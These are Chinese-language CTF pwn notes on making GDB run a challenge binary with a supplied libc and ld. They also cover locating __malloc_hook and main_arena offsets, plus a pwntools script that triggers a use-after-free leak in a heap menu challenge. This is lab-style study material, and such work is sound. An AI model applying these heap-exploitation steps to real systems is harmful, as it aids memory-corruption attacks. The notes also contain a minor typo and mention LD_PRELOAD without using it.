# 如何指定 GDB 使用某个 `.so` 来运行我的程序

首先，看题目给的是ld，还是libc，

若只有libc

1. 临时指定（只在这次 gdb 运行生效）
   适合不改二进制本体。

在 gdb 里执行：

```gdb
# 、、
set startup-with-shell off
set environment LD_LIBRARY_PATH /root/Pwn/[HNCTF_2022_WEEK4]ez_uafez_uaf
run
```

说明：

1. LD_PRELOAD 强行优先加载你给的 libc
2. LD_LIBRARY_PATH 用来补充同目录下其他依赖
3. 用对应动态加载器运行（最推荐）
   如果你手里还有 ld-2.27.so，这种最稳定，避免版本不匹配。

若都有

```bash
# 这里目录为Pwn，程序为pwn
gdb --args ./ld.so --library-path . ./pwn
set startup-with-shell off
set sysroot /nonexistent
set solib-search-path .
set breakpoint pending on
b main
run
```

## 寻找 hook 位置和内容

```bash
readelf -Ws libc-2.27.so | grep __malloc_hook

#gdb中
start
info address __malloc_hook
p &__malloc_hook

# 查看内容
p/x __malloc_hook
x/gx &__malloc_hook
x/16gx &__malloc_hook-0x40
```

寻找 hook 和 main_arena 的偏移

```gdb
p &main_areana
p &__malloc_hook
p/x (char *)&__malloc_hook - (char *)&main_arena
```

## pwntools 中 GDB 动调

`pause` 停止题目后，记住 pid，重开一个终端，`gdb -q ./ld.so -p pid`

```python
from pwn import *

context(os='linux', arch='amd64', log_level='debug')

elf  = ELF('./pwn')
libc = ELF('./libc.so.6')
ld   = ELF('./ld.so')

p = process([ld.path, '--library-path', '.', elf.path])

def add():
    p.sendlineafter(b'Choice: ', b'1')

def free(idx):
    p.sendlineafter(b'Choice: ', b'2')
    p.sendlineafter(b'Idx: \n', str(idx).encode())

def show(idx):
    p.sendlineafter(b'Choice: ', b'3')
    p.sendlineafter(b'Idx: \n', str(idx).encode())

def edit(idx, content):
    p.sendlineafter(b'Choice: ', b'4')
    p.sendlineafter(b'Idx: \n', str(idx).encode())
    p.sendlineafter(b'Size: \n', str(len(content)).encode())
    p.sendafter(b'Content: \n', content)

for i in range(8):
    add()
    edit(i, b'a' * 0x80)

add()
edit(8, b'a' * 0x10)

for i in range(8):
    free(i)

show(7)
data = p.recvuntil(b'Choice: ')

print(f'[+] pid = {p.pid}')
pause()   # 到这里停住，你手动开 gdb attach

print(hexdump(data))
p.interactive()
```

```bash
objdump -M intel -d libc-2.27.so | grep -A 8 -B 3 '26858'
```
